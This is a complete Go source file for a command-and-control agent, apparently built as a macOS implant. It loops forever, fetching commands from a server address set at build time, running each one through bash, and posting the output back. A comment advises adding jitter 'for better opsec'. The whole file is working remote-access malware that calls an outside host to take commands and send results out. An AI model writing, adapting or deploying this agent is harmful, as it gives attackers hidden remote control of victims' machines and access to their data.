package main

import (
	"bytes"
	"io/ioutil"
	"net/http"
	"os/exec"
	"strings"
	"time"
)

// go build -o agent-macos-x86 -ldflags "-X 'main.serverURL=http://192.168.1.100:8080'" agent/main.go
var serverURL string // set it during build with ldflags "-X 'main.serverURL=http://192.168.1.100:8080'

func main() {
	if serverURL == "" {
		serverURL = "http://127.0.0.1:8080" // fallback if no build flag was set
	}

	for {
		resp, err := http.Get(serverURL + "/get")
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}

		body, _ := ioutil.ReadAll(resp.Body)
		cmdStr := strings.TrimSpace(string(body))
		resp.Body.Close()

		if cmdStr != "" {
			cmd := exec.Command("bash", "-c", cmdStr)
			out, err := cmd.CombinedOutput()
			result := out
			if err != nil {
				result = append(result, []byte("\nError: "+err.Error())...)
			}

			http.Post(serverURL+"/result", "text/plain", bytes.NewBuffer(result))
		}

		time.Sleep(3 * time.Second) //this should be a variable. You want jitter for better opsec. 
	}
}

